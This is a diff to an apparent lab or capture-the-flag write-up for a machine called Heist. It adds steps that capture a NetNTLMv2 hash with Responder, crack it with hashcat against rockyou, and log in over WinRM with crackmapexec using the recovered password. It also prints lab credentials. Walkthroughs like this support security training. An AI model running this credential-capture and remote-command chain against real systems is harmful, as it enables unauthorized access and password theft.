@@ -374,6 +374,27 @@ responder -I tun0 -wv
 
 #### - After sending the request we receive a NetNTLMv2 hash for the user **enox** comes in to our Responder output.
 
+![](Pasted%20image%2020221012181626.png)
+
+#### - Copy the entire hash including the username and use a text editor to paste it into a file named hash.txt. After that, use the following commands to find the cracking mode needed for this hash type and then to begin cracking it:
+
+hashcat -h | grep -i "ntlmv2"
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
+
+#### - After no time at all, the hash is cracked and the password extracted from the cracked.txt file we output the results into.
+
+#### - Cat "cracked.txt" file which shows username enox and password california
+
+# PORT 5985
+
+#### - Typed crackmapexec winrm 192.168.123.165 -d heist.offsec -u enox -p california -x "whoami" and found user "heist/enox" is running on the target machine:
+
+![](Pasted%20image%2020221012181836.png)
+
+#### - Typed "net user enox" and noted current user "enox" is a part of "Web Admins" group memberships
+
+![](Pasted%20image%2020221012182010.png)
+
 
 
 ---
